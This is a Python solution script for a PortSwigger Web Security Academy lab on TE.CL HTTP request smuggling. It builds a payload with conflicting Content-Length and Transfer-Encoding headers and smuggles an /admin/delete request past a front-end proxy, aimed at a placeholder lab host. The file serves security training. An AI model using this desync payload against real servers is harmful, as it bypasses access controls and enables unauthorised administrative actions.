"""
Lab 7: Exploiting HTTP request smuggling to bypass front-end security controls (TE.CL)
https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-tecl
Difficulty: Practitioner

📝 Same goal as Lab 6, TE.CL variant of the underlying desync.
"""

from utils import send_same_connection, normalize_crlf, log, note, summarize_response

HOST = "YOUR-LAB-ID.web-security-academy.net"

SMUGGLED_INNER = normalize_crlf("""GET /admin/delete?username=carlos HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=""".format(host=HOST))

CHUNK_SIZE = format(len(SMUGGLED_INNER), "x")

SMUGGLE_PAYLOAD = normalize_crlf("""POST / HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

{chunk_size}
""".format(host=HOST, chunk_size=CHUNK_SIZE)) + SMUGGLED_INNER + normalize_crlf("\n0\n\n")

FOLLOWUP = normalize_crlf("""GET / HTTP/1.1
Host: {host}

""".format(host=HOST))


def run():
    note(f"Chunk size computed as 0x{CHUNK_SIZE} ({len(SMUGGLED_INNER)} bytes).")

    (r1, _), (r2, _) = send_same_connection(HOST, [SMUGGLE_PAYLOAD, FOLLOWUP])
    summarize_response(r1, "Smuggle request response")
    summarize_response(r2, "Follow-up response (should reflect carlos deleted)")


if __name__ == "__main__":
    run()
